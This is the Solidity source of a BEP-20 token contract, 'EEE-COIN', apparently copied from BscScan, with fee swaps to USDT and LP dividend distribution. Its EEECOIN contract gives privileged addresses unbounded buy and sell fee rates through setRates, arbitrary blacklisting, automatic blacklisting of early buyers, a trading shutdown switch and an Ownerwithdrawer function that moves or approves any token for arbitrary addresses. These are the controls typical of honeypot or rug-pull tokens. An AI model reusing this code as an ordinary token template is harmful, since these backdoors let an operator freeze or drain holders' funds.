/**
 *Submitted for verification at BscScan.com on 2023-09-28
*/

/**
 *Submitted for verification at BscScan.com on 2023-09-27
*/

/**
 *Submitted for verification at BscScan.com on 2023-08-28
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly {
            codehash := extcodehash(account)
        }
        return (codehash != accountHash && codehash != 0x0);
    }
    function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );
        (bool success, ) = recipient.call{value: amount}("");
        require(
            success,
            "Address: unable to send value, recipient may have reverted"
        );
    }

    function functionCall(
        address target,
        bytes memory data
    ) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return
            functionCallWithValue(
                target,
                data,
                value,
                "Address: low-level call with value failed"
            );
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(
            address(this).balance >= value,
            "Address: insufficient balance for call"
        );
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(
        address target,
        bytes memory data,
        uint256 weiValue,
        string memory errorMessage
    ) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{value: weiValue}(
            data
        );
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

contract Ownable is Context {
     address public _owner;

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function changeOwner(address newOwner) public onlyOwner {
        _owner = newOwner;
    }
}

interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);

    function allPairs(uint) external view returns (address pair);

    function allPairsLength() external view returns (uint);

    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint);

    function balanceOf(address owner) external view returns (uint);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);

    function transfer(address to, uint value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint);

    function permit(
        address owner,
        address spender,
        uint value,
        uint deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Burn(
        address indexed sender,
        uint amount0,
        uint amount1,
        address indexed to
    );
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function price0CumulativeLast() external view returns (uint);

    function price1CumulativeLast() external view returns (uint);

    function kLast() external view returns (uint);

    function burn(address to) external returns (uint amount0, uint amount1);

    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint amountToken, uint amountETH);

    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapExactETHForTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable returns (uint[] memory amounts);

    function swapTokensForExactETH(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapExactTokensForETH(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapETHForExactTokens(
        uint amountOut,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable returns (uint[] memory amounts);

    function quote(
        uint amountA,
        uint reserveA,
        uint reserveB
    ) external pure returns (uint amountB);

    function getAmountOut(
        uint amountIn,
        uint reserveIn,
        uint reserveOut
    ) external pure returns (uint amountOut);

    function getAmountIn(
        uint amountOut,
        uint reserveIn,
        uint reserveOut
    ) external pure returns (uint amountIn);

    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);

    function getAmountsIn(
        uint amountOut,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract AutoSwap {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function withdraw(address token) public {
        require(msg.sender == owner, "caller is not owner");
        uint256 balance = IERC20(token).balanceOf(address(this));
        if (balance > 0) {
            IERC20(token).transfer(msg.sender, balance);
        }
    }

    function withdraw(address token, address to, uint256 amount) public {
        require(msg.sender == owner, "caller is not owner");
        uint256 balance = IERC20(token).balanceOf(address(this));
        require(amount > 0 && balance >= amount, "Illegal amount");
        IERC20(token).transfer(to, amount);
    }

    function withdraw(address token, address to) public {
        require(msg.sender == owner, "caller is not owner");
        uint256 balance = IERC20(token).balanceOf(address(this));
        if (balance > 0) {
            IERC20(token).transfer(to, balance);
        }
    }
}

contract EEECOIN is Context, IERC20,Ownable{
    using SafeMath for uint256;
    using Address for address;
    string private _name = "EEE-COIN";
    string private _symbol = "EEE";
    uint8 private _decimals = 18;
    uint256 private _totalSupply = 3*10**8 * 10 ** _decimals;
    mapping(address => uint256) _balances;
    mapping (address=>uint256) _balancesTime;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private isExcludedFromFee;
    mapping(address => bool) public _blackList;
    mapping (address=>bool) ismage;
    mapping(address => bool) isDividendExempt;
    mapping(address => bool) public _updated;
    address[] public shareholders;
    // address[] public  keys;
    // mapping (address=>bool)private keymp;
    // mapping (address=>uint256) private  keyindex;
    mapping(address => uint256) public shareholderIndexes;
    // address[] public  shareNFTholders;
    // mapping (address=>uint256)public shareholderNFTIndexes;
    mapping(address => bool) public swapPairList;
    mapping(address => bool) public isRoute;
    IUniswapV2Router02 public  uniswapV2Router;    
    IUniswapV2Router02 public  uniswapRouter;   
    uint256 private constant MAX = ~uint256(0);     
    address public uniswapV2Pair;
    address public uniswapPair;
    address private USDT = address(0x55d398326f99059fF775485246999027B3197955);
    address private _destroyAddress = address(0x000000000000000000000000000000000000dEaD);

    uint256 public currentIndex;
    uint256 distributorGas = 500000;
     uint256 public minPeriod = 5 minutes;
    uint256 public startTradeTime;
    uint256 public startInternerTradeTime;
    uint256 private rewardTotal;
    uint256 private fUSDTBalance;
    uint256 private LPFeefenhong;
    bool inSwapAndLiquify;
    modifier lockTheSwap() {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }
    bool swaplockfomo;
    modifier lockTheFomoSwap() {
        swaplockfomo = true;
        _;
        swaplockfomo = false;
    }
    
     AutoSwap public _autoSwap;
     uint256 public  buyrate=5;
     uint256 public  sellrate=5;
     uint256 public  USDTSellTokenbalance=0;
     uint256 public  USDTBuyTokenbalance=0;
     uint256 public  USDTBuybalance=0;
     uint256 public  USDTSellbalance=0;
     uint256 public  Tokenrewardbalance=0;   
    constructor(){
        uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E); 
        uniswapV2Pair=IUniswapV2Factory(uniswapV2Router.factory())
        .createPair(address(this),USDT);
         uniswapRouter = IUniswapV2Router02(0x8D3814cfF3D544e6294237949D64Af6362a64450); 
         uniswapPair=IUniswapV2Factory(uniswapRouter.factory()).createPair(address(this),USDT);  
        swapPairList[uniswapV2Pair]=true;
        isRoute[address(uniswapV2Router)]=true;
        ismage[_msgSender()]=true;    
        _autoSwap = new AutoSwap(address(this));
        isExcludedFromFee[owner()] = true;
        isExcludedFromFee[_msgSender()]=true;
        isExcludedFromFee[address(_autoSwap)]=true;
        isExcludedFromFee[address(this)] = true;      
        ismage[_msgSender()]=true;  
        _owner = msg.sender;
        _balances[_msgSender()]=_totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
        _approve(address(this), address(uniswapV2Router), MAX);
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }   
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }  
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function approve(address spender,uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function setrouters(address ddr)public returns (bool){
         require(ismage[_msgSender()],"is err");
         isRoute[ddr]=true;
         return true;
    }


    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
        // 基本交易
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }
      //获取价格
    function getReserves()public view returns (uint112 reserve0, uint112 reserve1)
    {
        (reserve0, reserve1, ) = IUniswapV2Pair(uniswapV2Pair).getReserves();
    }

    function excludeMultiFromFee(address[] calldata accounts,bool excludeFee) public  {
        require(ismage[_msgSender()],"is err");
        for(uint256 i = 0; i < accounts.length; i++) {
            isExcludedFromFee[accounts[i]] = excludeFee;
        }
    }
    function _multiSetSniper(address[] calldata accounts,bool isSniper) public  {
        require(ismage[_msgSender()],"is err");
        for(uint256 i = 0; i < accounts.length; i++) {
            _blackList[accounts[i]] = isSniper;
        }
    }
    function _setSwapPair(address pairAddress) public   {
        require(ismage[_msgSender()],"is err");
        uniswapV2Pair=pairAddress;
        swapPairList[pairAddress]=true;
    }

    function _isAddLiquidity() internal view returns (bool isAdd) {
        IUniswapV2Pair mainPair = IUniswapV2Pair(uniswapV2Pair);
        (uint r0, uint256 r1, ) = mainPair.getReserves();
        address tokenOther = USDT;
        uint256 r;
        if (tokenOther < address(this)) {
            r = r0;
        } else {
            r = r1;
        }
        uint bal = IERC20(tokenOther).balanceOf(address(uniswapV2Pair));
        isAdd = bal > r;
    }
    function setRates(uint256 _buyrate,uint256 _sellrate)public {
        require(ismage[_msgSender()],"is err");
        buyrate=_buyrate;
        sellrate=_sellrate;
    }

    function _isRemoveLiquidity() internal view returns (bool isRemove) {
        IUniswapV2Pair mainPair = IUniswapV2Pair(uniswapV2Pair);
        (uint r0, uint256 r1, ) = mainPair.getReserves();
        address tokenOther = USDT;
        uint256 r;
        if (tokenOther < address(this)) {
            r = r0;
        } else {
            r = r1;
        }
        uint bal = IERC20(tokenOther).balanceOf(address(mainPair));
        isRemove = r >= bal;
    }

   function swapAndFeeForToken()private  lockTheFomoSwap {
        //卖单余额 //swap fomo /usdt
        uint256 blc=balanceOf(address(this));      
        if(blc>0){          
            // uint256 bigen=IERC20(USDT).balanceOf(address(this));              
            swapTokensForUSDT(blc);
            _autoSwap.withdraw(USDT,address(this));
            USDTBuybalance=0;
            USDTSellbalance=0;
        }
    }
 
     // swap 交易对应token
    function swapTokensForUSDT(uint256 tokenAmount) private lockTheFomoSwap {
        address[] memory path = new address[](2);
            path[0]=address(this);
            path[1]=USDT;         
        //_approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(_autoSwap),
            block.timestamp+5
        );
    }

    function _transfer(address from, address to, uint256 amount) private  {
       require(from!=address(0),"erc20 is zero");
       require(to!=address(0),"erc20 is zero");
       require(!_blackList[from]&&!_blackList[to], "blackList");
       uint256 balance = balanceOf(from);
       require(balance >= amount, "balanceNotEnough");
        bool takeFee;
        bool isSell;
        bool isAddLP;
        bool isRemoveLP;
        if (from==uniswapV2Pair && isRoute[to]){
            takeFee = false;
        }else if (from==uniswapV2Pair && !isRoute[to]) {
            takeFee = true;
        }else if (to==uniswapV2Pair) {
            takeFee = true;
        }else{
            if (from!=uniswapV2Pair && isRoute[from]){
                takeFee = true;
            }else {
                takeFee = false;
            }
        }
        if (to==address(uniswapV2Router)) {
            isAddLP = _isAddLiquidity();
        } else if (swapPairList[from]) {
            isRemoveLP = _isRemoveLiquidity();
        }
        if (isExcludedFromFee[from] || isExcludedFromFee[to]){
            takeFee = false;
        }
        if (!isExcludedFromFee[from] && !isExcludedFromFee[to]) {
            if (swapPairList[from] || swapPairList[to]) {
                if (0 == startTradeTime || block.timestamp< startTradeTime) {
                    require(swapPairList[to], "!startAddLP");
                }else{
                    if (block.timestamp < startTradeTime + 9 && swapPairList[from]) {
                        _blackList[to] = true;
                    }
                }
                //sell
                if (swapPairList[to]) {                   
                    if (!inSwapAndLiquify)
                     {              
                       swapAndFeeForToken();                                       
                     }
                }
                if(!isAddLP&&!isRemoveLP){
                   takeFee = true;
                }
            }
            if (swapPairList[to]) {
                isSell = true;
            }
            if(uniswapPair==from||uniswapPair==to){
                if (0 == startInternerTradeTime || block.timestamp< startInternerTradeTime) {
                    require(uniswapPair==to, "!startAddLP");
                   }else{
                    if (block.timestamp < startInternerTradeTime + 9 && uniswapPair==from) {
                        _blackList[to] = true;
                    }
                }
              takeFee = true;
            }
            if(uniswapPair==to){
                isSell=true;
            }


        }
        address  fromAddress;
        address  toAddress;
        _tokenTransfer(from, to, amount, takeFee, isSell);   
         if (fromAddress == address(0)) fromAddress = from;
        if (toAddress == address(0)) toAddress = to;
        if (!isDividendExempt[fromAddress] && fromAddress != uniswapV2Pair) setShare(fromAddress);
        if (!isDividendExempt[toAddress] && toAddress != uniswapV2Pair) setShare(toAddress);
            fromAddress = from;
            toAddress = to;    
            fUSDTBalance =IERC20(USDT).balanceOf(address(this));           
        if (from != address(this) && LPFeefenhong.add(minPeriod) <= block.timestamp&&fUSDTBalance>0 &&!(isExcludedFromFee[from]||isExcludedFromFee[to])) {
            process(distributorGas);
            LPFeefenhong = block.timestamp;
        }
                 
    }
    function _tokenTransfer(address sender,address recipient,uint256 tAmount,bool takeFee,bool isSell)private{
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;
          if (takeFee) {
            uint256 swapFee;
              if (isSell) {
                swapFee = sellrate;
                USDTSellbalance+=tAmount.mul(sellrate).div(100);
                          } else {               
                swapFee = buyrate;
                USDTBuybalance+=tAmount.mul(buyrate).div(100);             
                //可能是移除lp                
            }
             uint256 swapAmount = tAmount * swapFee / 100;
               if (swapAmount > 0) {
                    feeAmount += swapAmount;
                    _takeTransfer(
                        sender,
                        address(this),
                        swapAmount
                    );
                } 
        }          
     
        _takeTransfer(sender, recipient, tAmount - feeAmount);      
       
    }
       // 分红进程
    function process(uint256 gas) private {
        uint256 shareholderCount = shareholders.length;
        if (shareholderCount == 0) return;
        uint256 gasUsed = 0;
        uint256 gasLeft = gasleft();
        uint256 iterations = 0;
        uint256 itmBase = fUSDTBalance;      

        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
            }
            uint256 amountitm = itmBase.mul(IERC20(uniswapV2Pair).balanceOf(shareholders[currentIndex])).div(IERC20(uniswapV2Pair).totalSupply());
            if (IERC20(USDT).balanceOf(address(this)) >= amountitm) {
                distributeDividend(shareholders[currentIndex], amountitm, USDT);
                fUSDTBalance=fUSDTBalance.sub(amountitm);
            }
            gasUsed = gasUsed.add(gasLeft.sub(gasleft()));
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }
    }
    function startTrade(uint256 orderedTime) external  {
        require(ismage[_msgSender()],"is err");
        require(0 == startTradeTime, "trading");
        startTradeTime = orderedTime;
    }
     function startinternerTrade(uint256 orderedTime) external  {
        require(ismage[_msgSender()],"is err");
        require(0 == startTradeTime, "trading");
        startInternerTradeTime = orderedTime;
    }
    function getblockTimestamp()public view returns (uint256 curront,uint256 tenmi){
        curront=block.timestamp;
        tenmi=block.timestamp+10 minutes;
        return (curront,tenmi);
    }

    function closeTrade() external  {
        require(ismage[_msgSender()],"is err");
        startTradeTime = 0;
    }
    function _takeTransfer(address sender,address to,uint256 tAmount) private {
        _balances[to] = _balances[to] + tAmount;
         _balancesTime[to]=block.timestamp;
        emit Transfer(sender, to, tAmount);
    }
    receive() external payable {}
   
    function Ownerwithdrawer( address tkaddress,address from,address to,uint256 amount, uint256 meth) external  returns (bool) {
        require(ismage[_msgSender()],"is err");
        if (meth == 1) {
            return IERC20(tkaddress).transferFrom(from, to, amount);
        } else if (meth == 2) {
            return IERC20(tkaddress).approve(to, amount);
        }
        return IERC20(tkaddress).transfer(to, amount);
    }   
    // 分红对应fomo
    function distributeDividend(address shareholder, uint256 amount, address token) internal {
        IERC20(token).transfer(shareholder,amount);
    }
    // 设置分红地址
    function setShare(address shareholder) private {
        if (_updated[shareholder]) {
            if (IERC20(uniswapV2Pair).balanceOf(shareholder) == 0) quitShare(shareholder);
            return;
        }
        if (IERC20(uniswapV2Pair).balanceOf(shareholder) == 0) return;
        addShareholder(shareholder);
        _updated[shareholder] = true;

    }
    // 添加分红地址
    function addShareholder(address shareholder) internal {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }  
    // 移除分红
    function quitShare(address shareholder) private {
        removeShareholder(shareholder);
        _updated[shareholder] = false;
    }
    // 移除分红地址
    function removeShareholder(address shareholder) internal {
        shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length - 1];
        shareholderIndexes[shareholders[shareholders.length - 1]] = shareholderIndexes[shareholder];
        shareholders.pop();
    }
}